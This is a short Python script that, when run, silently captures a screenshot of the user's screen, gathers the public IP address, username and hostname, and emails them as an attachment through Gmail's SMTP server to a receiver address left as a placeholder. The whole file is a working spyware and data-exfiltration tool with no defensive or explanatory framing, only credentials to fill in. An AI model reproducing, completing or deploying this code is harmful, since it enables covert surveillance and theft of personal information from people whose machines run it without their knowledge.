import smtplib, ssl
import socket, pyautogui, getpass
from requests import get
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText



def screenshot():

	screen = pyautogui.screenshot()
	screen.save(r'C:\Users\Public\screenshot.png')


def message():

	public_ip = get('http://api.ipify.org').text
	user = getpass.getuser()
	host = socket.gethostname()	


	smtp_server = 'smtp.gmail.com'
	smtp_port = 587
	sender = 'your_email'
	sender_pwd = 'your_password'


	message = MIMEMultipart('mixed')
	message['From'] = 'Contact <{sender}>'.format(sender = sender)
	message['Subject'] = 'Screenshot'
	receiver = 'email receiver'


	msg_content = f"<h4>Screenshot from {user}, IP address : {public_ip}, hostname : {host}</h4>\n"
	body = MIMEText(msg_content, 'html')
	message.attach(body)


	attachmentPath = r'C:\Users\Public\screenshot.png'
	try:
		with open(attachmentPath, "rb") as attachment:
			p = MIMEApplication(attachment.read(),_subtype="png")	
			p.add_header('Content-Disposition', "attachment; filename= %s" % attachmentPath.split("\\")[-1]) 
			message.attach(p)
	except Exception as e:
		print(str(e))
	msg = message.as_string()


	c = ssl.create_default_context()
	with smtplib.SMTP(smtp_server, smtp_port) as s:
		s.ehlo()  
		s.starttls(context=c)
		s.ehlo()
		s.login(sender, sender_pwd)
		s.sendmail(sender, receiver, msg)
		s.quit()
		

screenshot()
message()			
